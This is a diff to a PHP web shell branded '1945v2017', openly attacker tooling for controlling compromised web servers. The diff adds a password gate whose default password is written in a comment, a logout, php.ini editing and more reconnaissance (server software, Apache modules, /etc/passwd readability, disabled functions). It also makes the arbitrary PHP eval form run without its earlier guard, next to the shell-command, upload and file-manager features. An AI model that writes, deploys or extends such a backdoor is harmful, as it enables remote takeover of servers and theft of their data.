@@ -9,10 +9,35 @@
 @
 */
 #@error_reporting(0);
+session_start();
 @set_time_limit(0);
 @ini_set('file_uploads',on);
 @ini_set('upload_max_filesize',1000);
-@ini_set('error_log',0);
+@ini_set('error_log','.error-log-1945.txt'); // save error log , report if any error to : alinkokomansuby@gmail.com
+$passwd_45 		= "fe4530f3758f14e06d97b05f44c9f856"; // default password : indonesianpeople
+$session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'])];
+$image_bg_45 	= "http://wallpapers-best.com/uploads/posts/2015-10/1_indonesia.jpg";
+
+function passwd_45_login($wallpaper) { 
+	echo "<html><head><title>".$_SERVER['HTTP_HOST']." - shutdown57 - 1945v2017</title></head><body>";
+	echo "<style>body{background:url('".$wallpaper."')no-repeat center center;";
+	echo "background-size:cover;background-attachment:fixed;-o-background-size:cover;-moz-background-size:cover;-webkit-background-size:cover;";
+	echo "-o-background-attachment:fixed;-moz-background-attachment:fixed;-webkit-background-attachment:fixed}";
+	echo "input{color:green;border:1px solid green;margin-top:250px;margin-bottom:250px;background:transparent;}";
+	echo "</style>";
+    echo "<form method='POST'><center><input type='password' name='pass' placeholder='Password'><input type='submit' value='>>'></center></form>";
+   exit; 
+} 
+
+
+if(!isset($session_45)){ 
+    if(empty($passwd_45)||(isset($_POST['pass'])&&(md5($_POST['pass'])==$passwd_45))){ 
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
+
+}else{ 
+        passwd_45_login($image_bg_45);
+}
+}
 
 class Html45{
 	public function modal($head,$konten,$id){
@@ -47,10 +72,11 @@ class Html45{
 		echo "<center><h1>./ ".$text."</h1></center>";
 	}
 	public function txtarea($name,$content,$add){
-		echo "<center>";
-		echo "<textarea name='".$name."' ".$add."'>";
-		echo $content;
-		echo "</textarea></center>";
+		$txt = "<center>";
+		$txt.= "<textarea name='".$name."' ".$add."'>";
+		$txt.= $content;
+		$txt.= "</textarea></center>";
+		return $txt;
 	}
 	public function select($option,$name,$add){
 		echo "<select name='".$name."' ".$add.">";
@@ -146,17 +172,17 @@ class FileMan45{
 
 		$s = @scandir($dir);
 			echo "<tr>";
-			echo "<td colspan='6'><a href='?_d=".dirname($dir)."'>..</a></td>";
+			echo "<td colspan='6'>[[ <a href='?_d=".dirname($dir)."'>..</a> ]]</td>";
 			echo "<td><select><option>--New--</option>
-				<option onclick=\"window.location.href='?_o=$dir/$d&_x=nfile'\">NewFile</option>
-				<option onclick=\"window.location.href='?_o=$dir/$d&_x=ndir'\">NewDir</option></select>";
+				<option onclick=\"window.location.href='?_o=$dir&_x=nfile'\">NewFile</option>
+				<option onclick=\"window.location.href='?_o=$dir&_x=ndir'\">NewDir</option></select>";
 			echo "</tr>";
 		foreach($s as $d)
 		{
 
 			if(!is_dir("$dir/$d")||$d=="."||$d=="..")continue;
 			echo "<tr>";
-			$this->td("<a href='?_d=$dir/$d'>$d</a>");
+			$this->td("[ <a href='?_d=$dir/$d'>$d</a> ]");
 			$this->td($this->fSize45("$dir/$d"));
 			$this->td($this->mime45("$dir/$d"));
 			$this->td($this->owngro45("$dir/$d"));
@@ -328,9 +354,9 @@ class Action45{
 
 class Head45{
 	public function html45($judul){
-		echo "<!DOCTYPE html><html><head><title>$judul</title><link rel='stylesheet' type='text/css' href='https://cdn.jsdelivr.net/picnicss/6.3.2/picnic.min.css'></head><body>";
+		echo "<!DOCTYPE html><html><head><title>$judul</title><link rel='stylesheet' type='text/css' href='https://cdn.jsdelivr.net/picnicss/6.3.2/picnic.min.css'><link rel='icon' type='text/css' href='http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif'></head><body>";
 		echo "<style>";
-		echo "tr,td{height:30px;font-size:13px;}</style>";
+		echo "tr,td{height:30px;font-size:13px;}tr:hover{background:#ff4136;}tr a{color:#000;font-weight:bold;}tr a:hover{color:#fff;border-bottom:1px solid #fff}.pseudo:hover{background:#ff4136;color:#fff}th{background:#ff4136}</style>";
 	}
 	public function hdd45($s) {
 		if($s >= 1073741824)
@@ -379,8 +405,9 @@ class Head45{
     <a href="?_o='.$dir.'&_x=sh" class="pseudo button ">Shell</a>
     <label for="modal_1" class="pseudo button">Upload</label>
     <a href="?_o='.$dir.'&_x=php" class="pseudo button ">PHP</a>
-        <label for="secinfo" class="pseudo button">Sec. Info</label>
-				  <label for="weapon" class="pseudo button">WeaponX1945</label>
+    <label for="secinfo" class="pseudo button">Sec. Info</label>
+	<label for="weapon" class="pseudo button">WeaponX1945</label>
+	<a href="?_o='.$dir.'&_x=I_love_U" class="pseudo button ">LogOut</a>
   </div>
 </nav>';
 echo '
@@ -428,27 +455,37 @@ echo '
 			$etcpw = "/etc/passwd : <font color=red> NOT READABLE</font>";
 		}
 		if(ini_get('disable_functions')){
-			$df = "disable functions : ".ini_get('disable_functions');
+			$str = ini_get('disable_functions');
+			$df = "disable functions : ".wordwrap($str,40,"<br>",TRUE);
 		}else{
 			$df = "disable functions : <font color=green> NONE </font> (Not Secure)";
 		}
-		if(is_writable("/etc/php/7.0/fpm/php.ini"))
+		if(is_writable(php_ini_loaded_file()))
 		{
-			$ini = "php.ini : <font color=green> WRITABLE </font>";
+			$ini = green("WRITEABLE")." | <a href='?_o=".__DIR__."&_x=phpini'>Edit php.ini</a>";
 		}else {
-			$ini = "php.ini : <font color=red> NOT WRITABLE</font>";
+			$ini = red("NOT WRITABLE");
 		}
 		$curl = (curl_init()) ? green("YOSHA") : red("NONE");
 		$mysql = (function_exists('mysql_connect')) ? green("YOSHA") : red("NONE");
+		$mysqli = (function_exists('mysqli_connect')) ? green("YOSHA") : red("NONE");
+		if(function_exists('apache_get_modules')){
+			$apache_load_module ="<b> Apache Loaded Module : ". wordwrap(implode(",",apache_get_modules()),40,"<br>",TRUE)."</b>";
+		}else{
+			$apache_load_module = "";
+		}
 		$html = new Html45();
+		
 		$head = "Security Info : ".$_SERVER['HTTP_HOST']." < ".gethostbyname($_SERVER['HTTP_HOST'])." > ";
-		$konten = "<b> IP Client : </b> ".$_SERVER['REMOTE_ADDR']."<hr>";
-		$konten.= "<b> MySQL :".$mysql." | CURL : ".$curl."</b><hr>";
+		$konten = "<b> Server Software :". $_SERVER['SERVER_SOFTWARE'] . "</b><hr>";
+		$konten.= $apache_load_module."<hr>";
+		$konten.= "<b> IP Client : </b> ".$_SERVER['REMOTE_ADDR']."<hr>";
+		$konten.= "<b> MySQL :".$mysql." | CURL : ".$curl." | MySQLI : ".$mysqli." | </b><hr>";
 		$konten.= "<b> passwd file </b><br>".$etcpw;
 		$konten.= "<hr><b>Disable Functions </b><br>";
 		$konten.= $df;
 		$konten.= "<hr><b> php.ini</b><br>";
-		$konten.= $ini."<a href='?_o=".__DIR__."&_x=phpini'> [Add php.ini]</a>";
+		$konten.= $ini;
 		$id = "secinfo";
 		$html->modal($head,$konten,$id);
 	}
@@ -483,7 +520,7 @@ $html->modal("WeaponX1945",$weapon,"weapon");
 // End List
 
 $Head = new Head45();
-$Head->html45("1945 < ".$_SERVER['PHP_SELF']." > ~ ".$_SERVER['HTTP_HOST']);
+$Head->html45("1945-X-".$_SERVER['HTTP_HOST']);
 
 $Head->SysInfo45($d);
 $Head->Tools45($d);
@@ -535,19 +572,16 @@ if($act->del45($_GET['_o'])){
 		echo "</pre>";
 	}
 }elseif ($x == "php") {
-	if(function_exists('eval'))
-	{
+
 	$html->h1("PHP Eval ");
-	$content = array($html->txtarea("eval","phpinfo();","style='width:700px;height:300px;'"),
-			   $html->submit("evals","Execute php",""));
-	$html->form("POST",$content[0].$content[1]);
+	$content = $html->txtarea("eval","phpinfo();","style='width:700px;height:300px;'");
+	$content .=$html->submit("evals","Execute php","");
+	$html->form("POST",$content);
 	if(isset($_POST['evals']))
 	{
-		@eval($_POST['eval']);
+		eval($_POST['eval']);
 	}
-}else{
-	$html->h1("Eval() function Not Exists In Server ~");
-}
+
 
 }elseif ($x == "phpinfo") {
 	$act->phpinfo45();
@@ -557,7 +591,7 @@ if($act->del45($_GET['_o'])){
 	if(isset($_POST['simpan']))
 	{
 		if($act->cfile45($_GET['_o']."/".$_POST['nama'],$_POST['newfile'])){
-			echo "<script>alert('Make File Done !'); window.location.href='?_d=".dirname($_GET['_o'])."'</script>";
+			echo "<script>alert('Make File Done !'); window.location.href='?_d=".$_GET['_o']."'</script>";
 		}else{
 			echo "<script> alert('Permission denied.. can not create file ')</script>";
 		}
@@ -606,6 +640,9 @@ if($act->del45($_GET['_o'])){
 				echo "<script> alert('Yosha !');  window.location.href='?_o=$d/wordpress-config.txt&_x=view'</script>";
 			}
 		}
+}elseif ($x == "I_love_U") {
+	session_destroy();
+	echo "<script> alert('Bye Bye Bye !'); window.location.href='".$_SERVER['PHP_SELF']."'; </script>";
 }
 }
 
